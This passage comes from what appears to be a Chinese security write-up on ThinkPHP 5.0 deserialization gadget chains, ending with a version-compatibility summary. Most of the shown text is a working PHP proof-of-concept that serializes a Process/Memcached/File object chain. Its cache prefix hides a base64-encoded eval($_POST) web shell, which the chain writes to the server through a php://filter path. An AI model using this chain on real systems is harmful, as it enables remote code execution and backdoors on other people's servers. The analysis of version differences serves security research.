        $this-&gt;handler = (new \think\cache\driver\Memcached);
    `}`
`}`


namespace think\cache\driver;

class Memcached
`{`
    protected $tag;
    protected $options;
    protected $handler;

    public function __construct()
    `{`
        $this-&gt;tag = true;
        $this-&gt;options = [
            'expire'   =&gt; 0,
            'prefix'   =&gt; 'PD9waHAgZXZhbCgkX1BPU1RbJ3pjeTIwMTgnXSk7ID8+',
        ];
        $this-&gt;handler = (new File);
    `}`
`}`

class File
`{`
    protected $tag;
    protected $options;
    public function __construct()
    `{`
        $this-&gt;tag = false;
        $this-&gt;options = [
            'expire'        =&gt; 3600,
            'cache_subdir'  =&gt; false,
            'prefix'        =&gt; '',
            'data_compress' =&gt; false,
            'path'          =&gt; 'php://filter/convert.base64-decode/resource=./',
        ];
    `}`
`}`

echo urlencode(serialize(new \think\Process()));
```

效果如下：

[![](https://p3.ssl.qhimg.com/t01cec8ab4bbf7a155a.png)](https://p3.ssl.qhimg.com/t01cec8ab4bbf7a155a.png)

[![](https://p1.ssl.qhimg.com/t01c6aba9c98cd082fe.png)](https://p1.ssl.qhimg.com/t01c6aba9c98cd082fe.png)

[![](https://p2.ssl.qhimg.com/t0118fe5763190463b2.png)](https://p2.ssl.qhimg.com/t0118fe5763190463b2.png)

[![](https://p2.ssl.qhimg.com/t01d543a98c4cfe377e.png)](https://p2.ssl.qhimg.com/t01d543a98c4cfe377e.png)

[![](https://p3.ssl.qhimg.com/t015cd4db8af99dfff4.png)](https://p3.ssl.qhimg.com/t015cd4db8af99dfff4.png)

[![](https://p0.ssl.qhimg.com/t0184210088b0ecefeb.png)](https://p0.ssl.qhimg.com/t0184210088b0ecefeb.png)

[![](https://p3.ssl.qhimg.com/t0133e4bc68272e9f3a.png)](https://p3.ssl.qhimg.com/t0133e4bc68272e9f3a.png)



## 3. 总结

如果是从think\process\pipes\Windows的__destruct方法出发，则必须要关注think\Model的toArray方法是否存在利用点，且toArray方法受版本影响较大，经常改变。如果think\Process的__destruct方法出发则需要关注Relation类是否已经变为抽象类，该变化是从thinkphp5.0.04版本开始。之后利用就再无其它变化影响。网上的大部分高版本链子都是从think\process\pipes\Windows的__destruct方法出发，所以在遇到低版本时，会出现错误。判断这类高版本链子在不同版本下是否可用的关键就在于是否在toArray中存在触发点。网上已有的高版本链子我也就不加赘述，拾人牙慧了。
